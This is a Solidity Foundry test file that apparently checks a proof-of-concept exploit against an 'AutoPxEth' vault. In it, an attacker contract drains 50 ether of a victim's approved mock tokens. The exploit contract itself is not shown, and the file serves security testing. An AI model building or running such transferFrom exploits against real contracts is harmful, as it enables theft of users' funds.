// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import "forge-std/Test.sol";
import "../contracts/MockERC20.sol";
import "../contracts/AutoPxEth.sol";
import "../contracts/ExploitTransferFrom.sol";

contract ExploitTransferFromTest is Test {
    AutoPxEth vault;
    MockERC20 token;
    ExploitTransferFrom exploit;

    address victim = address(0x1234);
    address attacker = address(0x5678);

    function setUp() public {
        token = new MockERC20("Mock Token", "MOCK", 18);
        vault = new AutoPxEth(address(token), address(this));
        exploit = new ExploitTransferFrom();

        // Mint tokens for victim
        token.mint(victim, 100 ether);

        // Victim approves the vault
        vm.prank(victim);
        token.approve(address(vault), 100 ether);

        // Victim approves the exploit contract
        vm.prank(victim);
        token.approve(address(exploit), 50 ether);
    }

    function testExploit() public {
        // Attacker executes the exploit
        vm.prank(attacker);
        exploit.exploit(address(vault), victim, 50 ether);

        // Assert that the attacker has stolen the funds
        assertEq(token.balanceOf(attacker), 50 ether, "Exploit failed");
    }
}
